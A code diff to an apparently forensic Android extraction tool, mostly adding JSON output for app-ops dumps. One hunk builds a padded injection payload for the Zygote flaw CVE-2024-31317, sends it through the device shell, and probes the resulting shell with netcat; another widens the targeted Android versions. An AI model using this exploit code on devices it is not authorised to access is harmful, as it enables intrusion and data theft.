@@ -1046,7 +1046,7 @@ class MyApp(ctk.CTk):
 
         # Exploiting attempt
         if incl_cve == "on":
-            if int(software.split(".")[0]) in range(9,12):
+            if int(software.split(".")[0]) in range(9,16) and spl < "2024-06-01":
                 self.change.set(0)
                 self.prog_text.configure(text="")
                 self.progress.pack_forget()
@@ -1171,18 +1171,34 @@ class MyApp(ctk.CTk):
     def show_app_ops(self):
         ctk.CTkLabel(self.dynamic_frame, text=f"ALEX by Christian Peter  -  Output: {dir_top}", text_color="#3f3f3f", height=60, padx=40, font=self.stfont).pack(anchor="w")
         ctk.CTkLabel(self.dynamic_frame, text="Query App-Ops", height=60, width=585, font=("standard",24), justify="left").pack(pady=20)
-        self.text = ctk.CTkLabel(self.dynamic_frame, text="Extracting the App Ops.", width=585, height=60, font=self.stfont, anchor="w", justify="left")
+        self.text = ctk.CTkLabel(self.dynamic_frame, text="Choose the output format:", width=585, height=60, font=self.stfont, anchor="w", justify="left")
         self.text.pack(pady=15)
+        self.choose = ctk.BooleanVar(self, False)
+        self.txtb = ctk.CTkButton(self.dynamic_frame, text="TXT", font=self.stfont, command=lambda: self.choose.set(False))
+        self.txtb.pack(pady=10)
+        self.jsonb = ctk.CTkButton(self.dynamic_frame, text="JSON", font=self.stfont, command=lambda: self.choose.set(True))
+        self.jsonb.pack(pady=10)
+        self.abortb = ctk.CTkButton(self.dynamic_frame, text="Back", font=self.stfont, fg_color="#8c2c27", text_color="#DCE4EE", command=lambda: self.switch_menu("LogMenu"))
+        self.abortb.pack(pady=10)    
+        self.wait_variable(self.choose)
+        self.txtb.pack_forget()
+        self.jsonb.pack_forget()
+        self.abortb.pack_forget()
+        self.text.configure(text="Extracting the App Ops.") 
         self.progress = ctk.CTkProgressBar(self.dynamic_frame, width=585, height=30, corner_radius=0)
         self.progress.set(0)
         self.prog_text = ctk.CTkLabel(self.dynamic_frame, text="0%", width=585, height=20, font=self.stfont, anchor="w", justify="left")
         self.prog_text.pack()
         self.progress.pack()
         self.change = ctk.IntVar(self, 0)
-        self.get_appops = threading.Thread(target=lambda: dump_appops(self.change, self.text, self.progress, self.prog_text))
+        jsonout = self.choose.get()
+        self.get_appops = threading.Thread(target=lambda: dump_appops(self.change, self.text, self.progress, self.prog_text, jsonout=jsonout))
         self.get_appops.start()
         self.wait_variable(self.change)
-        self.text.configure(text=f"App-Ops saved in folder: {snr}_appops")
+        if jsonout == True:
+            self.text.configure(text=f"App-Ops saved in folder: {snr}_appops")
+        else:
+            self.text.configure(text=f"App-Ops saved as: {snr}_appops.json")
         self.prog_text.pack_forget()
         self.progress.pack_forget()
         self.after(100, lambda: ctk.CTkButton(self.dynamic_frame, text="OK", font=self.stfont, command=lambda: self.switch_menu("LogMenu")).pack(pady=40)) 
@@ -2379,17 +2395,16 @@ def dump_bugreport(change, progress, prog_text):
     change.set(1)
 
 # Actually Dumping the App Opss
-def dump_appops(change, text, progress, prog_text, folder=None):
-    
+def dump_appops(change, text, progress, prog_text, folder=None, jsonout=False):
     apps_len = len(all_apps)
 
     AGO_RE = re.compile(
     r"\+"
     r"(?:(\d+)d)?"
     r"(?:(\d+)h)?"
-    r"(?:(\d+)m)?"
-    r"(?:(\d+)s)?"
     r"(?:(\d+)ms)?"
+    r"(?:(\d+)s)?"
+    r"(?:(\d+)m)?"
     r"(?:\s+ago)?"
     )
 
@@ -2403,6 +2418,14 @@ def dump_appops(change, text, progress, prog_text, folder=None):
     re.IGNORECASE
     )
 
+    APP_OP_RE = re.compile(
+    r"(?P<key>[A-Z_]+):\s*(?P<rest>.+)"
+    )
+
+    KV_RE = re.compile(
+        r"(?P<k>[A-Za-z]+)\s*=\s*(?P<v>[^;]+)"
+    )
+
     #Convert Time to seconds
     def duration_to_seconds(s: str) -> float:
         log("Started App Ops extraction")
@@ -2410,7 +2433,7 @@ def dump_appops(change, text, progress, prog_text, folder=None):
         if not m:
             raise ValueError(f"Unknown format: {s}")
 
-        d, h, m_, s_, ms = (int(x) if x else 0 for x in m.groups())
+        d, h, ms, s_, m_ = (int(x) if x else 0 for x in m.groups())
 
         return (
             d * 86400 +
@@ -2430,17 +2453,47 @@ def dump_appops(change, text, progress, prog_text, folder=None):
 
         def repl_duration(match):
             seconds = duration_to_seconds(match.group("value"))
-            return f"{match.group('key')}={int(seconds)}"
+            return f"{match.group('key')}={round(seconds)}"
 
         text = DURATION_FIELD_RE.sub(repl_duration, text)
 
         return text
+    
+    #Create a dict for json
+    def parse_app_text(text: str) -> dict:
+        result = {}
+        for line in text.splitlines():
+            line = line.strip()
+            if not line:
+                continue
+            m = APP_OP_RE.search(line)
+            if not m:
+                continue
+            entry_key = m.group("key")
+            rest = m.group("rest")
+            parts = [p.strip() for p in rest.split(";") if p.strip()]
+            mode = parts[0]
+            kv_items = []
+            for part in parts[1:]:
+                kv = KV_RE.match(part)
+                if kv:
+                    k = kv.group("k")
+                    v = kv.group("v")
+                    if v.isdigit():
+                        v = int(v)
+                    kv_items.append({k: v})
+            if not kv_items:
+                result[entry_key] = mode
+            else:
+                result[entry_key] = [mode, *kv_items]
+        return result
 
     if folder == None:
         folder = f"{snr}_appops"
     try: os.mkdir(folder)
     except: pass
     i=0
+    ops_dict = {}
     for app in all_apps:
         text.configure(text=f"Extracting the App Ops.\nCurrent package: {app[:56]}")
         i += 1
@@ -2461,8 +2514,15 @@ def dump_appops(change, text, progress, prog_text, folder=None):
         if "No operations" in app_ops or app_ops == "":
             pass
         else:
-            with open(os.path.join(folder, f"{app}.txt"), "w", encoding="utf-8", errors="ignore") as f:
-                f.write(app_ops) 
+            if jsonout == True:
+                parsed = parse_app_text(app_ops)
+                ops_dict[app] = parsed
+            else:
+                with open(os.path.join(folder, f"{app}.txt"), "w", encoding="utf-8", errors="ignore") as f:
+                    f.write(app_ops) 
+    if ops_dict != {}:
+        with open(f"{snr}_apps_opps.json", "w", encoding="utf-8") as f:
+            json.dump(ops_dict, f, indent=2, ensure_ascii=False)
     log("Extracted App Ops")
     change.set(1)
 
@@ -3372,6 +3432,11 @@ def exploit_zygote(zip_path, text, prog_text, change):
     cve_file = os.path.join(os.path.dirname(__file__), "ressources" , "cve", "2024_31317.txt")
     with open(cve_file,"r") as f:
         cve_cmd = f.read()
+    if int(software.split(".")[0]) > 11:
+        payload = "\n" * 3000 + "A" * 5157
+        payload += cve_cmd
+        payload += "," + ",\n" * 1400
+        cve_cmd = payload
     try: device.shell(cve_cmd, timeout=4)
     except: pass
     cmd = '''sh -c \"echo 'toybox whoami' | toybox nc localhost 4321\"'''
